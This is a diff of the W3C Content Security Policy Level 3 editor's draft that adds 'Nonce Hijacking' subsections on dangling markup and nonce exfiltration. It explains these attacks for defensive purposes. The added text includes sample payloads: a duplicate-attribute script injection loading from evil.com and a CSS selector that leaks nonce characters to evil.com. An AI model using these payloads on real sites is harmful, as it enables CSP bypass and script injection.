@@ -1212,9 +1212,9 @@ Possible extra rowspan handling
 		}
 	}
 </style>
-  <meta content="Bikeshed version 3d3d56b4350a4c381fdf2373ffcf534daaa9ba33" name="generator">
+  <meta content="Bikeshed version 30dbdcf66519991ec52011cac10c49a7b5b449c5" name="generator">
   <link href="https://www.w3.org/TR/CSP3/" rel="canonical">
-  <meta content="c126ebc91a9864ffdc508953d61412f5f27427f3" name="document-revision">
+  <meta content="07ba1fff78f39707fec541400794b23c7987f7b2" name="document-revision">
 <style>
   ul.toc ul ul ul {
     margin: 0 0 0 2em;
@@ -1505,7 +1505,7 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
   <div class="head">
    <p data-fill-with="logo"><a class="logo" href="https://www.w3.org/"> <img alt="W3C" height="48" src="https://www.w3.org/StyleSheets/TR/2016/logos/W3C" width="72"> </a> </p>
    <h1>Content Security Policy Level 3</h1>
-   <h2 class="no-num no-toc no-ref heading settled" id="subtitle"><span class="content">Editor’s Draft, <time class="dt-updated" datetime="2018-11-07">7 November 2018</time></span></h2>
+   <h2 class="no-num no-toc no-ref heading settled" id="subtitle"><span class="content">Editor’s Draft, <time class="dt-updated" datetime="2018-11-09">9 November 2018</time></span></h2>
    <div data-fill-with="spec-metadata">
     <dl>
      <dt>This version:
@@ -1851,7 +1851,12 @@ c-[il] { color: #000000 } /* Literal.Number.Integer.Long */
      <a href="#security-considerations"><span class="secno">7</span> <span class="content">Security and Privacy Considerations</span></a>
      <ol class="toc">
       <li><a href="#security-nonces"><span class="secno">7.1</span> <span class="content">Nonce Reuse</span></a>
-      <li><a href="#security-nonce-stealing"><span class="secno">7.2</span> <span class="content">Nonce Stealing</span></a>
+      <li>
+       <a href="#security-nonce-hijacking"><span class="secno">7.2</span> <span class="content">Nonce Hijacking</span></a>
+       <ol class="toc">
+        <li><a href="#dangling-markup-attacks"><span class="secno">7.2.1</span> <span class="content">Dangling markup attacks</span></a>
+        <li><a href="#nonce-exfiltration-content-attributes"><span class="secno">7.2.2</span> <span class="content">Nonce exfiltration via content attributes</span></a>
+       </ol>
       <li><a href="#security-nonce-retargeting"><span class="secno">7.3</span> <span class="content">Nonce Retargeting</span></a>
       <li><a href="#security-css-parsing"><span class="secno">7.4</span> <span class="content">CSS Parsing</span></a>
       <li><a href="#security-violation-reports"><span class="secno">7.5</span> <span class="content">Violation Reports</span></a>
@@ -4955,7 +4960,7 @@ directive-value = <a data-link-type="grammar" href="https://tools.ietf.org/html/
     <h5 class="heading settled algorithm" data-algorithm="Is element nonceable?" data-level="6.6.3.1" id="is-element-nonceable"><span class="secno">6.6.3.1. </span><span class="content"> Is <var>element</var> nonceable? </span><a class="self-link" href="#is-element-nonceable"></a></h5>
     <p>Given an <code class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#element" id="ref-for-element①⓪">Element</a></code> (<var>element</var>), this algorithm returns "<code>Nonceable</code>" if
   a <a data-link-type="grammar" href="#grammardef-nonce-source" id="ref-for-grammardef-nonce-source⑤"><code>nonce-source</code></a> expression can match the element (as discussed
-  in <a href="#security-nonce-stealing">§7.2 Nonce Stealing</a>), and "<code>Not Nonceable</code>" if such expressions
+  in <a href="#security-nonce-hijacking">§7.2 Nonce Hijacking</a>), and "<code>Not Nonceable</code>" if such expressions
   should not be applied.</p>
     <ol>
      <li data-md>
@@ -5355,7 +5360,8 @@ http://example.com 'strict-dynamic' 'unsafe-inline'
   provide a substantial improvement over <a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline③">'unsafe-inline'</a> when
   layering a content security policy on top of old code. When considering <a data-link-type="grammar" href="#grammardef-unsafe-inline" id="ref-for-grammardef-unsafe-inline④">'unsafe-inline'</a>, authors are encouraged to consider nonces
   (or hashes) instead.</p>
-    <h3 class="heading settled" data-level="7.2" id="security-nonce-stealing"><span class="secno">7.2. </span><span class="content">Nonce Stealing</span><a class="self-link" href="#security-nonce-stealing"></a></h3>
+    <h3 class="heading settled" data-level="7.2" id="security-nonce-hijacking"><span class="secno">7.2. </span><span class="content">Nonce Hijacking</span><a class="self-link" href="#security-nonce-hijacking"></a></h3>
+    <h4 class="heading settled" data-level="7.2.1" id="dangling-markup-attacks"><span class="secno">7.2.1. </span><span class="content">Dangling markup attacks</span><a class="self-link" href="#dangling-markup-attacks"></a></h4>
     <p>Dangling markup attacks such as those discussed in <a data-link-type="biblio" href="#biblio-filedescriptor-2015">[FILEDESCRIPTOR-2015]</a> can be used to repurpose a page’s legitimate nonces for injections. For
   example, given an injection point before a <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①⓪">script</a></code> element:</p>
 <pre class="highlight"><c- p>&lt;</c-><c- f>p</c-><c- p>></c->Hello, [INJECTION POINT]<c- p>&lt;/</c-><c- f>p</c-><c- p>></c->
@@ -5372,6 +5378,33 @@ http://example.com 'strict-dynamic' 'unsafe-inline'
     <p>The <a href="#is-element-nonceable">§6.6.3.1 Is element nonceable?</a> algorithm attempts to mitigate this specific
   attack by walking through <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script" id="ref-for-script①②">script</a></code> or <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/semantics.html#the-style-element" id="ref-for-the-style-element③">style</a></code> element attributes, looking for the
   string "<code>&lt;script</code>" or "<code>&lt;style</code>" in their names or values.</p>
+    <p>User-agents must pay particular attention when implementing this algorithm to
+  not ignore duplicate attributes. If an element has a duplicate attribute any
+  instance of the attribute after the first one is ignored but in the <a href="#is-element-nonceable">§6.6.3.1 Is element nonceable?</a> algorithm, all attributes including the
+  duplicate ones need to be checked.</p>
+    <p class="issue" id="issue-74cb0fbd"><a class="self-link" href="#issue-74cb0fbd"></a> Currently the HTML spec’s parsing algorithm removes this information
+  before the <a href="#is-element-nonceable">§6.6.3.1 Is element nonceable?</a> algorithm can be run which makes it
+  impossible to actually detect duplicate attributes. <a href="https://github.com/whatwg/html/issues/3257">&lt;https://github.com/whatwg/html/issues/3257></a></p>
+    <p>For the following example page:</p>
+<pre class="highlight">Hello, [INJECTION POINT]
+<c- p>&lt;</c-><c- f>script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>abc</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
+</pre>
+    <p>The following injected string will use a duplicate attribute to attempt to
+  bypass the <a href="#is-element-nonceable">§6.6.3.1 Is element nonceable?</a> algorithm check:</p>
+<pre class="highlight">Hello, <c- p>&lt;</c-><c- f>script</c-> <c- e>src</c-><c- o>=</c-><c- s>'https://evil.com/evil.js'</c-> <c- e>x</c-><c- o>=</c-><c- s>""</c-> <c- e>x</c-><c- o>=</c->
+<c- s>&lt;script</c-> <c- e>nonce</c-><c- o>=</c-><c- s>"abcd"</c-> <c- e>src</c-><c- o>=</c-><c- s>/good.js</c-><c- p>>&lt;/</c-><c- f>script</c-><c- p>></c->
+</pre>
+    <h4 class="heading settled" data-level="7.2.2" id="nonce-exfiltration-content-attributes"><span class="secno">7.2.2. </span><span class="content">Nonce exfiltration via content attributes</span><a class="self-link" href="#nonce-exfiltration-content-attributes"></a></h4>
+    <p>Some attacks on CSP rely on the ability to exfiltrate
+  nonce data via various mechanisms that can read content attributes.
+  CSS selectors are the best example: through clever use of
+  prefix/postfix text matching selectors values can be sent out to an
+  attacker’s server for reuse. Example:</p>
+<pre class="highlight"><c- f>script[nonce=a] </c-><c- p>{</c-> <c- k>background</c-><c- p>:</c-> <c- nf>url</c-><c- p>(</c-><c- s>"https://evil.com/nonce?a"</c-><c- p>);}</c->
+</pre>
+    <p>The <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce①">nonce</a></code> section talks about mitigating these types
+  of attacks by hiding the nonce from the element’s content attribute and
+  moving it into an internal slot. This is done to ensure that the <code>nonce</code> value is exposed to scripts but not any other non-script channels.</p>
     <h3 class="heading settled" data-level="7.3" id="security-nonce-retargeting"><span class="secno">7.3. </span><span class="content">Nonce Retargeting</span><a class="self-link" href="#security-nonce-retargeting"></a></h3>
     <p>Nonces bypass <a data-link-type="grammar" href="#grammardef-host-source" id="ref-for-grammardef-host-source⑤">host-source</a> expressions, enabling developers to load code from any
   origin. This, generally, is fine, and desirable from the developer’s perspective. However, if an
@@ -5525,7 +5558,7 @@ http://example.com 'strict-dynamic' 'unsafe-inline'
 ...
 </pre>
      <p>This will generate a request for <code>https://cdn.example.com/script.js</code>, which
-    will not be blocked because of the matching <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce①">nonce</a></code> attribute.</p>
+    will not be blocked because of the matching <code><a data-link-type="element-sub" href="https://html.spec.whatwg.org/multipage/urls-and-fetching.html#attr-nonce" id="ref-for-attr-nonce②">nonce</a></code> attribute.</p>
      <p>If <code>script.js</code> contains the following code:</p>
 <pre class="highlight"><c- a>var</c-> s <c- o>=</c-> document<c- p>.</c->createElement<c- p>(</c-><c- t>'script'</c-><c- p>);</c->
 s<c- p>.</c->src <c- o>=</c-> <c- t>'https://othercdn.not-example.net/dependency.js'</c-><c- p>;</c->
@@ -7062,7 +7095,8 @@ rest of Google’s CSP Cabal.</p>
    <ul>
     <li><a href="#ref-for-attr-nonce">6.6.3.3. 
     Does element match source list for type and source? </a>
-    <li><a href="#ref-for-attr-nonce①">8.2. 
+    <li><a href="#ref-for-attr-nonce①">7.2.2. Nonce exfiltration via content attributes</a>
+    <li><a href="#ref-for-attr-nonce②">8.2. 
     Usage of "'strict-dynamic'" </a>
    </ul>
   </aside>
@@ -7230,7 +7264,7 @@ rest of Google’s CSP Cabal.</p>
     Is element nonceable? </a> <a href="#ref-for-script⑦">(2)</a>
     <li><a href="#ref-for-script⑧">6.6.3.3. 
     Does element match source list for type and source? </a> <a href="#ref-for-script⑨">(2)</a>
-    <li><a href="#ref-for-script①⓪">7.2. Nonce Stealing</a> <a href="#ref-for-script①①">(2)</a> <a href="#ref-for-script①②">(3)</a>
+    <li><a href="#ref-for-script①⓪">7.2.1. Dangling markup attacks</a> <a href="#ref-for-script①①">(2)</a> <a href="#ref-for-script①②">(3)</a>
     <li><a href="#ref-for-script①③">8.2. 
     Usage of "'strict-dynamic'" </a> <a href="#ref-for-script①④">(2)</a> <a href="#ref-for-script①⑤">(3)</a>
     <li><a href="#ref-for-script①⑥">8.4. 
@@ -7272,7 +7306,7 @@ rest of Google’s CSP Cabal.</p>
     <li><a href="#ref-for-the-style-element">6.1.14. style-src</a>
     <li><a href="#ref-for-the-style-element①">6.6.3.3. 
     Does element match source list for type and source? </a> <a href="#ref-for-the-style-element②">(2)</a>
-    <li><a href="#ref-for-the-style-element③">7.2. Nonce Stealing</a>
+    <li><a href="#ref-for-the-style-element③">7.2.1. Dangling markup attacks</a>
    </ul>
   </aside>
   <aside class="dfn-panel" data-for="term-for-top-level-browsing-context">
@@ -8255,6 +8289,9 @@ rest of Google’s CSP Cabal.</p>
   impact by doing this check only for <code><a data-link-type="element" href="https://html.spec.whatwg.org/multipage/scripting.html#script">script</a></code> elements when a nonce is
   present, but we should probably consider this algorithm as "at risk" until
   we know its impact. <a href="https://github.com/w3c/webappsec-csp/issues/98">&lt;https://github.com/w3c/webappsec-csp/issues/98></a><a href="#issue-4592ac7e"> ↵ </a></div>
+   <div class="issue"> Currently the HTML spec’s parsing algorithm removes this information
+  before the <a href="#is-element-nonceable">§6.6.3.1 Is element nonceable?</a> algorithm can be run which makes it
+  impossible to actually detect duplicate attributes. <a href="https://github.com/whatwg/html/issues/3257">&lt;https://github.com/whatwg/html/issues/3257></a><a href="#issue-74cb0fbd"> ↵ </a></div>
   </div>
   <aside class="dfn-panel" data-for="content-security-policy">
    <b><a href="#content-security-policy">#content-security-policy</a></b><b>Referenced in:</b>
